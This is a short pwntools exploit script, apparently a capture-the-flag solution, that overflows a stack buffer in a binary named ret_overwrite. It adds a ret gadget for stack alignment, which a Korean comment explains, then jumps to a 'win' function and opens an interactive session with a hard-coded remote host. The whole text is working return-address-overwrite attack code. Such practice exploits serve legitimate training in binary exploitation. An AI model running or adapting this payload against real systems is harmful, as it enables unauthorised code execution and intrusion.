from pwn import *

e = ELF('./ret_overwrite')
#r = process('./ret_overwrite')
r = remote('34.64.219.95', 19512)

WIN_ADDR = p64(e.symbols["win"])
RET_ADDR = p64(0x4011af)

PAYLOAD = b'\x41' * 0x30
PAYLOAD += b'\x42' * 0x8
'''
do_system+115 에서 seg fault 발생할때 처리한느 방법
system : rsp가 0x10의 배수의 주소로 끝나야함
 -> 임의의 ret 가젯 주소 추가해서 RIP 주소가 0x8만큼 움직이게 트리거해서
    RIP의 주소 끝이 0x10으로 되도록 align 해줘야함
'''
PAYLOAD += RET_ADDR
PAYLOAD += WIN_ADDR

r.sendline(PAYLOAD)

r.interactive()